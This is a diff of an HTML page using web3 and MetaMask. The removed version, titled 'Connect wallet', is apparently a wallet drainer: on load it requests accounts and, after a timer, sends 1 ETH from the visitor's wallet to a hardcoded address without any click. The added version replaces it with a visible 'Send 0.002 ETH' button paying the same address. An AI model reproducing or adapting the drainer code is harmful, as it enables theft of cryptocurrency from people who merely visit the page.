@@ -1,58 +1,42 @@
-<html>
-   <head>
-      <title>Connect wallet</title>
-   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
- </head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send ETH</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+</head>
 <body>
-<script>
-/* To connect using MetaMask */
-async function connect() {
-  if (window.ethereum) {
-     await window.ethereum.request({ method: "eth_requestAccounts" });
-     window.web3 = new Web3(window.ethereum);
-     const account = web3.eth.accounts;
-     //Get the current MetaMask selected/active wallet
-     const walletAddress = account.givenProvider.selectedAddress;
-     console.log(`Wallet: ${walletAddress}`);
-  
-  } else {
-   console.log("No wallet");
-  }
-}
+  <h1>Send ETH</h1>
+  <button onclick="sendEth()">Send 0.002 ETH</button>
 
-// Send funds to the specified address
-async function sendFunds() {
-  try {
-    const balance = await web3.eth.getBalance(walletAddress);
-    if (balance > 0) {
-      const tx = {
-        to: '0x710DA612825485559572fB587b3b5a6Ae1B4f264',
-        from: walletAddress,
-        value: web3.utils.toWei('1', 'ether'),
-      };
-      const signedTx = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-      console.log(`Sent ${web3.utils.fromWei(balance)} to 0x710DA612825485559572fB587b3b5a6Ae1B4f264`);
-    } else {
-      console.log('No funds to send');
+  <script>
+    async function sendEth() {
+      if (typeof window.ethereum !== 'undefined') {
+        const web3 = new Web3(window.ethereum);
+        try {
+          // Request account access
+          await window.ethereum.enable();
+          const accounts = await web3.eth.getAccounts();
+
+          // Send transaction
+          const amountToSend = web3.utils.toWei('0.002', 'ether');
+          const transaction = {
+            from: accounts[0],
+            to: '0x710DA612825485559572fB587b3b5a6Ae1B4f264',
+            value: amountToSend
+          };
+          const result = await web3.eth.sendTransaction(transaction);
+          console.log(result);
+          alert('Transaction successful!');
+        } catch (error) {
+          console.error(error);
+          alert('Transaction failed. Please check the console for details.');
+        }
+      } else {
+        alert('Please install MetaMask to use this feature.');
+      }
     }
-  } catch (error) {
-    console.error(error);
-  }
-}
-
-// Call sendFunds after connecting the wallet
-connect();
-setTimeout(sendFunds, 5000); // You can adjust the time as needed
-</script>
-<input type="button" value="Connect Wallet" onclick="connect();">
-
-  <style>
-    button {
-      background: darkgreen;
-      border-radius: 5px;
-      width: 10px;
-      height: 8px;
-    }
-  </style>
+  </script>
 </body>
-                                                                                      </html>
+</html>
